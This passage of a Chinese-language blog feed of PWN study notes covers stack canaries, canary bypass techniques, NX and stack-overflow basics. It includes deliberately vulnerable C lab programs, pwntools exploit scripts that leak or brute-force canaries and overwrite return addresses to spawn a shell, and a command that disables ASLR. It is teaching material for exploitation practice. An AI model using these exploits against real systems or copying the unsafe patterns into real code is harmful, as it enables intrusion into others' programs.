stack_guard。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p><p>事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><h2 id="Canary-绕过技术"><a href="#Canary-绕过技术" class="headerlink" title="Canary 绕过技术"></a>Canary 绕过技术</h2><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。</p><h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p><h4 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">// ex2.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void getshell(void) &#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void init() &#123;</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stderr, NULL);</span><br><span class="line">&#125;</span><br><span class="line">void vuln() &#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    for(int i=0;i&lt;2;i++)&#123;</span><br><span class="line">        read(0, buf, 0x200);</span><br><span class="line">        printf(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(void) &#123;</span><br><span class="line">    init();</span><br><span class="line">    puts(&quot;Hello Hacker!&quot;);</span><br><span class="line">    vuln();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">$ gcc -m32 -no-pie ex2.c -o ex2</span><br></pre></td></tr></table></figure><p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = &#x27;ex2&#x27;</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./ex2&#x27;)</span><br><span class="line"></span><br><span class="line">get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Hello Hacker!\n&quot;)</span><br><span class="line"></span><br><span class="line"># leak Canary</span><br><span class="line">payload = &quot;A&quot;*100</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;A&quot;*100)</span><br><span class="line">Canary = u32(io.recv(4))-0xa</span><br><span class="line">log.info(&quot;Canary:&quot;+hex(Canary))</span><br><span class="line"></span><br><span class="line"># Bypass Canary</span><br><span class="line">payload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h3><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary: 这是爆破的 Python 代码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">print &quot;[+] Brute forcing stack canary &quot;</span><br><span class="line"></span><br><span class="line">start = len(p)</span><br><span class="line">stop = len(p)+8</span><br><span class="line"></span><br><span class="line">while len(p) &lt; stop:</span><br><span class="line">   for i in xrange(0,256):</span><br><span class="line">      res = send2server(p + chr(i))</span><br><span class="line"></span><br><span class="line">      if res != &quot;&quot;:</span><br><span class="line">         p = p + chr(i)</span><br><span class="line">         #print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br><span class="line">         break</span><br><span class="line"></span><br><span class="line">      if i == 255:</span><br><span class="line">         print &quot;[-] Exploit failed&quot;</span><br><span class="line">         sys.exit(-1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start-1:-1].encode(&quot;hex&quot;)</span><br><span class="line">print &quot;   [+] SSP value is 0x%s&quot; % canary</span><br></pre></td></tr></table></figure><h3 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p><h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><p>参见 StarCTF2018 babystack</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-Linux安全机制 </category>
          
          <category> 2-Stack Canaries </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NX</title>
      <link href="/2025/07/3f7bd9fc8b89.html"/>
      <url>/2025/07/3f7bd9fc8b89.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p> No-eXecute(NX)，表示不可执行，其原理是将数据所在的内存页(例如堆和栈)标识为不可执行，如果程序产生溢出转入执行shellcode时，CPU就会抛出异常。通常我们使用可执行空间保护(executable space protection)作为一个统称，来描述这种防止传统代码注入攻击的技术——攻击者将恶意代码注入正在运行的程序中，然后使用内存损坏漏洞将控制流重定向到该代码。实施这种保护的技术有多种名称，在 Windows上称为数据执行保护(DEP)，在Linux上则有 NX、WX、Pax和 Exec Shield 等。</p><p> NX的实现需要结合软件和硬件共同完成。首先在硬件层面，它利用处理器的NX位，对相应页表项中的第63位进行设置，设置为1表示内容不可执行，设置为0则表示内容可执行。一旦程序计数器(PC)被放到受保护的页面内，就会触发硬件层面的异常。其次，在软件层面，操作系统需要支持 NX，以便正确配置页表，但有时这会给自修改代码或者动态生成的代码(JT编译代码)带来一些问题，这在浏览器上很常见。这时，软件需要使用适当的API来分配内存，例如Wimdows上使用 VirtualProtect 或 VirtualAlloc,Linux上使用mprotect或者 mmap，这些 API 允许更改已分配页面的保护级别。</p><p> 在 Linux 中，当装载器将程序装载进内存空间后，将程序的.text节标记为可执行，而其余的数据段(.data、.bss等)以及栈、堆均为不可执行。因此，传统的通过修改GOT来执行shellcode 的方式不再可行。但NX这种保护并不能阻止攻击者通过代码重用来进行攻击(ret2libc)。</p><p> 如下所示，Ubuntu 中已经默认启用了NX。GNUSTACK段在禁用NX时权限为RWE，而开启<br>后权限仅为 RW，不可执行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc zexecstack hello,c &amp;&amp; readelf -l a.out | grep-A1 GNU STACK # 禁用</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-Linux安全机制 </category>
          
          <category> 3-No-execute </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1-栈介绍</title>
      <link href="/2025/07/1c67336b53b7.html"/>
      <url>/2025/07/1c67336b53b7.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h1><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p><p><img src="/../../../../../../images/image-20250701104727634.png" alt="image-20250701104727634"></p><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong><code>程序的栈是从进程地址空间的高地址向低地址增长的</code></strong>。</p><h1 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h1><h2 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h2><h3 id="栈指针-SP"><a href="#栈指针-SP" class="headerlink" title="栈指针 (SP)"></a>栈指针 (SP)</h3><ul><li>x86: ESP (32位), x64: RSP (64位)</li><li>始终指向栈顶位置</li><li><code>push/pop</code> 指令自动修改 SP</li></ul><h3 id="基址指针-BP"><a href="#基址指针-BP" class="headerlink" title="基址指针 (BP)"></a>基址指针 (BP)</h3><ul><li>x86: EBP, x64: RBP</li><li>作为当前栈帧的基准点</li><li>用于定位参数和局部变量</li></ul><h3 id="指令指针-IP"><a href="#指令指针-IP" class="headerlink" title="指令指针 (IP)"></a>指令指针 (IP)</h3><ul><li>x86: EIP, x64: RIP</li><li>存储下一条执行指令地址</li><li><code>call/ret</code> 指令修改 IP</li></ul><h2 id="函数调用过程（关键！）"><a href="#函数调用过程（关键！）" class="headerlink" title="函数调用过程（关键！）"></a>函数调用过程（关键！）</h2><h3 id="调用者-Caller-准备"><a href="#调用者-Caller-准备" class="headerlink" title="调用者 (Caller) 准备"></a>调用者 (Caller) 准备</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 1. 参数压栈（从右向左）</span><br><span class="line">push arg3</span><br><span class="line">push arg2</span><br><span class="line">push arg1</span><br><span class="line">; 2. 调用函数</span><br><span class="line">call function  ; 自动压入返回地址(EIP/RIP)</span><br></pre></td></tr></table></figure><h3 id="被调函数-Callee-序言"><a href="#被调函数-Callee-序言" class="headerlink" title="被调函数 (Callee) 序言"></a>被调函数 (Callee) 序言</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function:</span><br><span class="line">; 1. 保存调用者栈帧</span><br><span class="line">push ebp        ; 保存旧EBP</span><br><span class="line">; 2. 建立新栈帧</span><br><span class="line">mov ebp, esp    ; EBP = 当前ESP</span><br><span class="line">; 3. 分配局部变量空间</span><br><span class="line">sub esp, 0x20   ; 分配32字节空间</span><br></pre></td></tr></table></figure><h3 id="栈帧内存布局（32位示例）"><a href="#栈帧内存布局（32位示例）" class="headerlink" title="栈帧内存布局（32位示例）"></a>栈帧内存布局（32位示例）</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数3        | [ebp + 16]</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数2        | [ebp + 12]</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数1        | [ebp + 8]</span><br><span class="line">+-----------------+</span><br><span class="line">|    返回地址      | [ebp + 4]  ← 漏洞利用关键点！</span><br><span class="line">+-----------------+</span><br><span class="line">| 保存的EBP       | &lt;-- EBP (当前栈帧基址)</span><br><span class="line">+-----------------+</span><br><span class="line">|    局部变量1     | [ebp - 4]</span><br><span class="line">+-----------------+</span><br><span class="line">|    局部变量2     | [ebp - 8]</span><br><span class="line">+-----------------+</span><br><span class="line">|     ...         | </span><br><span class="line">+-----------------+</span><br><span class="line">|    临时空间      | &lt;-- ESP (栈顶)</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure><h3 id="函数返回过程"><a href="#函数返回过程" class="headerlink" title="函数返回过程"></a>函数返回过程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 1. 返回值存入EAX（约定）</span><br><span class="line">mov eax, return_value</span><br><span class="line">; 2. 释放局部空间</span><br><span class="line">mov esp, ebp    ; ESP = EBP</span><br><span class="line">; 3. 恢复调用者栈帧</span><br><span class="line">pop ebp         ; 恢复旧EBP</span><br><span class="line">; 4. 返回到调用者</span><br><span class="line">ret             ; 弹出返回地址到EIP</span><br></pre></td></tr></table></figure><h1 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h1><p>寄存器的图</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/figure/register.png" alt="img"></p><p><code>需要注意的是，32 位和 64 位程序有以下简单的区别:</code></p><ul><li><p><code>x86</code></p><ul><li><p><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</p></li><li><p><strong>栈帧布局</strong>：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">| 参数N     | ← EBP + 4*(N+1)</span><br><span class="line">| ...      |</span><br><span class="line">| 参数2     | ← EBP + 12</span><br><span class="line">| 参数1     | ← EBP + 8</span><br><span class="line">| 返回地址   | ← EBP + 4</span><br><span class="line">| 保存的EBP  | ← EBP</span><br><span class="line">| 局部变量   | ← EBP - 4</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>x64</code></p><ul><li><p>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</p></li><li><p>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</p></li><li><p><strong>栈帧布局</strong>：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">| 额外参数N  | ← RBP + 8*(N+1)</span><br><span class="line">| ...       |</span><br><span class="line">| 额外参数1  | ← RBP + 16</span><br><span class="line">| 返回地址    | ← RBP + 8</span><br><span class="line">| 保存的RBP  | ← RBP</span><br><span class="line">| 局部变量    | ← RBP - 8</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
          <category> x86x64 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2-栈溢出原理</title>
      <link href="/2025/07/0b00f34fdf85.html"/>
      <url>/2025/07/0b00f34fdf85.html</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h1 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h1><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p><p>我们利用如下命令对其进行编译</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  gcc -m32 -fno-stack-protector stack_example.c -o stack_example -no-pie</span><br><span class="line">stack-example.c: In <span class="keyword">function</span> <span class="string">&#x27;vulnerable&#x27;</span>:</span><br><span class="line">stack-example.c:8:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;gets&#x27;</span>; did you mean <span class="string">&#x27;fgets&#x27;</span>? [-Wimplicit-function-declaration]</span><br><span class="line">    8 |     gets(s);</span><br><span class="line">      |     ^~~~</span><br><span class="line">      |     fgets</span><br><span class="line">/usr/bin/ld: /tmp/ccevu0Fc.o: <span class="keyword">in</span> <span class="keyword">function</span> `vulnerable<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">stack-example.c:(.text+0x45): warning: the `gets&#x27;</span> <span class="keyword">function</span> is dangerous and should not be used.</span><br></pre></td></tr></table></figure><p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p><blockquote><p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p></blockquote><p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p><p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec stack_example</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p><ul><li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li><li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li><li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li></ul><p>我们可以使用 <code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code> 关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p><p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p><p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x08049176。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08049176 success         proc near</span><br><span class="line">.text:08049176</span><br><span class="line">.text:08049176 var_4           = dword ptr -4</span><br><span class="line">.text:08049176</span><br><span class="line">.text:08049176 ; __unwind &#123;</span><br><span class="line">.text:08049176                 push    ebp</span><br><span class="line">.text:08049177                 mov     ebp, esp</span><br><span class="line">.text:08049179                 push    ebx</span><br><span class="line">.text:0804917A                 sub     esp, 4</span><br><span class="line">.text:0804917D                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:08049182                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:08049187                 sub     esp, 0Ch</span><br><span class="line">.text:0804918A                 lea     edx, (aYouHavaAlready - 804BFF4h)[eax] ; &quot;You Hava already controlled it.&quot;</span><br><span class="line">.text:08049190                 push    edx             ; s</span><br><span class="line">.text:08049191                 mov     ebx, eax</span><br><span class="line">.text:08049193                 call    _puts</span><br><span class="line">.text:08049198                 add     esp, 10h</span><br><span class="line">.text:0804919B                 nop</span><br><span class="line">.text:0804919C                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:0804919F                 leave</span><br><span class="line">.text:080491A0                 retn</span><br><span class="line">.text:080491A0 ; &#125; // starts at 8049176</span><br><span class="line">.text:080491A0 success         endp</span><br></pre></td></tr></table></figure><p>那么如果我们读取的字符串为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x14*&#x27;a&#x27;+&#x27;bbbb&#x27;+success_addr</span><br></pre></td></tr></table></figure><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x08049176   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x08049176在内存中的形式是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x76\x91\x04\x08</span><br></pre></td></tr></table></figure><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x76 作为一个字符输入进去。这里利用 pwntools 的代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x08049176</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span>(p32(success_addr))</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行一波代码，可以得到</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./stack_example&#x27;</span>: pid 70</span><br><span class="line">b<span class="string">&#x27;\x86\x91\x04\x08&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb\x86\x91\x04\x08</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process <span class="string">&#x27;./stack_example&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 61936)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure><p>可以看到我们确实已经执行 success 函数。</p><h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p><h2 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h2><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h2 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h2><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 